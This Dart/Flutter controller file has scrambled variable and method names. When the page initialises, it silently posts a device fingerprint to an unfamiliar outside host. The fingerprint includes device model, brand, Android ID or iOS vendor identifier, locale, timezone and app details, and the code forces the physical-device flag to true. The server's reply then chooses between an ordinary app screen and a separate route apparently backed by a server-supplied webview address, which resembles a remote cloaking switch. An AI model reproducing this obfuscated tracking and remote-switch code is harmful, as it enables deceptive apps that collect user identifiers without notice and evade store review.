import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var lnvrfgoy = RxBool(false);
  var qmslruc = RxBool(true);
  var gqob = RxString("");
  var nora = RxBool(false);
  var konopelski = RxBool(true);
  final cjylufqd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    twmvo();
  }


  Future<void> twmvo() async {

    nora.value = true;
    konopelski.value = true;
    qmslruc.value = false;

    cjylufqd.post("https://sca.drumtw.xyz/xmadyizvslcrqogfewkht",data: await dosinwmzhq()).then((value) {
      var wdioskau = value.data["wdioskau"] as String;
      var uriehckb = value.data["uriehckb"] as bool;
      if (uriehckb) {
        gqob.value = wdioskau;
        tracey();
      } else {
        graham();
      }
    }).catchError((e) {
      qmslruc.value = true;
      konopelski.value = true;
      nora.value = false;
    });
  }

  Future<Map<String, dynamic>> dosinwmzhq() async {
    final DeviceInfoPlugin vzxekfo = DeviceInfoPlugin();
    PackageInfo rwlbv_xchsba = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qwatc = Platform.localeName;
    var ief_zToFdmu = currentTimeZone;

    var ief_WlnBYDay = rwlbv_xchsba.packageName;
    var ief_bPk = rwlbv_xchsba.version;
    var ief_huHVm = rwlbv_xchsba.buildNumber;

    var ief_zRejmc = rwlbv_xchsba.appName;
    var ief_wOP = "";
    var ief_OGtgR  = "";
    var ief_fmZqS = "";
    var alisonWindler = "";
    var sammieBartoletti = "";
    var abdulOrn = "";
    var emilianoWyman = "";


    var ief_tXeL = "";
    var ief_Vm = false;

    if (GetPlatform.isAndroid) {
      ief_tXeL = "android";
      var bsfjldi = await vzxekfo.androidInfo;

      ief_fmZqS = bsfjldi.brand;

      ief_wOP  = bsfjldi.model;
      ief_OGtgR = bsfjldi.id;

      ief_Vm = bsfjldi.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ief_tXeL = "ios";
      var rjcoexkd = await vzxekfo.iosInfo;
      ief_fmZqS = rjcoexkd.name;
      ief_wOP = rjcoexkd.model;

      ief_OGtgR = rjcoexkd.identifierForVendor ?? "";
      ief_Vm  = rjcoexkd.isPhysicalDevice;
    }
    ief_Vm = true;
    var res = {
      "ief_zRejmc": ief_zRejmc,
      "ief_bPk": ief_bPk,
      "ief_huHVm": ief_huHVm,
      "ief_tXeL": ief_tXeL,
      "ief_wOP": ief_wOP,
      "emilianoWyman" : emilianoWyman,
      "ief_WlnBYDay": ief_WlnBYDay,
      "ief_zToFdmu": ief_zToFdmu,
      "ief_fmZqS": ief_fmZqS,
      "ief_OGtgR": ief_OGtgR,
      "sammieBartoletti" : sammieBartoletti,
      "qwatc": qwatc,
      "ief_Vm": ief_Vm,
      "alisonWindler" : alisonWindler,
      "abdulOrn" : abdulOrn,

    };
    return res;
  }

  Future<void> graham() async {
    Get.offAllNamed("/targetTab");
  }

  Future<void> tracey() async {
    Get.offAllNamed("/targetPool");
  }

}
